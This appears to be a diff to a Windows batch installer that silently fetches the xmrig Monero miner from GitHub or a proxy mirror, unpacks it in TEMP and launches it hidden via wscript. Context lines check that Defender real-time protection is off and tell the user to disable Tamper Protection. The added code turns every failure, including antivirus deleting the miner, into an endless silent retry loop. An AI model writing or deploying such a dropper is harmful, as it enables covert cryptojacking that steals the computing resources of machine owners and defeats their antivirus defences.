@@ -81,33 +81,39 @@ powershell -NoProfile -ExecutionPolicy Bypass -Command ^
   "; if ($rtpOn -eq $false -or $hasTemp) { exit 0 } else { exit 3 }"
 if errorlevel 3 call :FAIL "The antivirus settings did not take effect." "Open _xmr_defender.log in %TEMP% -- it lists what is guarding this machine. Tamper Protection is on: turn it off in Windows Security > Virus & threat protection > Manage settings, then run again."
 
-rem ------------------------------------------------------------------ download --
+rem ---------------------------------------------------------------- fetch loop --
 rem github.com first, mirror only if the direct route is blocked.
+rem
+rem Everything from here down to the launch runs in an endless retry loop.  A
+rem flaky mirror, a truncated transfer, or antivirus eating the unpacked exe
+rem are all transient; this installer is silent, so a dialog box would mean
+rem the operator has to notice it and come back to start over.  Retrying costs
+rem a few seconds and no attention.  Each round logs why the previous one
+rem failed into _xmr_defender.log, and waits five seconds before trying again
+rem so a hard failure cannot spin the CPU.
+set "TRY=0"
 if not exist "%DL%" mkdir "%DL%"
 set "ZIP=%DL%\%NAME%"
 
-if exist "%ZIP%" (
-    call :CHECK_HASH "%ZIP%" "%ZIP_SHA%"
-    if "!HASH_OK!"=="1" goto :UNPACK
-    del /q "%ZIP%" 2>nul
-)
+:RETRY
+set /a TRY+=1
+
+rem Wipe last round's leavings: a half-written zip, and any unpack folder.
+rem A folder holding a running exe refuses to delete and is skipped, harmless.
+del /q "%ZIP%" 2>nul
+for /d %%d in ("%TEMP%\XMR_*") do rd /s /q "%%d" 2>nul
 
 set "GOT=0"
 call :FETCH "%RAW%/%NAME%" direct 0
-if "!GOT!"=="1" goto :DOWNLOADED
+if "!GOT!"=="1" goto :GOT_ZIP
 call :FETCH "https://gh-proxy.com/%RAW%/%NAME%" mirror 2
-if "!GOT!"=="1" goto :DOWNLOADED
-call :FAIL "Could not download the package." "Tried github.com first, then the gh-proxy mirror. Check the network and run again."
+if "!GOT!"=="1" goto :GOT_ZIP
+call :RETRY_WAIT "download failed (direct and mirror)"
 
-:DOWNLOADED
+:GOT_ZIP
 call :CHECK_HASH "%ZIP%" "%ZIP_SHA%"
-if not "!HASH_OK!"=="1" (
-    del /q "%ZIP%" 2>nul
-    call :FAIL "The download failed its SHA256 check." "Truncated or altered in transit. Run again."
-)
+if not "!HASH_OK!"=="1" call :RETRY_WAIT "zip sha256 mismatch"
 
-rem -------------------------------------------------------------- unpack + run --
-:UNPACK
 set "TS="
 for /f "usebackq delims=" %%i in (`powershell -NoProfile -Command "Get-Date -Format yyyyMMdd_HHmmss"`) do set "TS=%%i"
 if not defined TS set "TS=run"
@@ -115,21 +121,17 @@ set "DIR=%TEMP%\XMR_%TS%"
 set "EXE=%DIR%\xmrig-6.26.0\xmrig.exe"
 set "CFG=%DIR%\xmrig-6.26.0\config.json"
 
-rem Fresh folder every run: a running exe cannot be overwritten (its image is
-rem mapped), which used to leave a stale binary behind and fail the hash check.
-for /d %%d in ("%TEMP%\XMR_*") do rd /s /q "%%d" 2>nul
-
 mkdir "%DIR%" 2>nul
 copy /y "%ZIP%" "%DIR%\%NAME%" >nul
+if not exist "%DIR%\%NAME%" call :RETRY_WAIT "cannot copy the zip into TEMP"
 
 powershell -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -LiteralPath '%DIR%\%NAME%' -DestinationPath '%DIR%' -Force" 2>nul
-if not exist "%EXE%" call :FAIL "Unpacking failed: xmrig.exe is gone." "The antivirus swallowed it. See _xmr_defender.log in %TEMP%."
+if not exist "%EXE%" call :RETRY_WAIT "xmrig.exe missing after unpack (antivirus?)"
 
 call :CHECK_HASH "%EXE%" "%EXE_SHA%"
-if not "!HASH_OK!"=="1" (
-    if !EXE_SIZE! LSS 100000 call :FAIL "xmrig.exe was replaced by the antivirus." "Only !EXE_SIZE! bytes left -- that is a quarantine stub, not the miner."
-    call :FAIL "xmrig.exe does not match." "size !EXE_SIZE! bytes. actual !HASH_ACTUAL!"
-)
+if not "!HASH_OK!"=="1" call :RETRY_WAIT "xmrig.exe sha256 mismatch, !EXE_SIZE! bytes"
+
+rem Both hashes verified -- this round produced a clean miner, fall through.
 
 rem max-threads-hint 100 is xmrig's default (RxConfig::threads returns every
 rem logical core when limit >= 100) -- written out so the config says so
@@ -167,6 +169,13 @@ rem accepts them.
 wscript.exe //nologo "%TEMP%\_xmr_run.vbs"
 del /q "%TEMP%\_xmr_run.vbs" 2>nul
 exit /b 0
+
+rem Log the reason, pause, and start the round over.  Never returns: every
+rem caller is a failure path that wants a fresh attempt.
+:RETRY_WAIT
+>> "%DVLOG%" echo retry !TRY!: %~1
+ping -n 6 127.0.0.1 >nul
+goto :RETRY
 
 rem certutil prints a header line, the hex digest, then a trailer.  findstr
 rem matches the trailer too ("CertUtil:" starts with a hex letter), so take
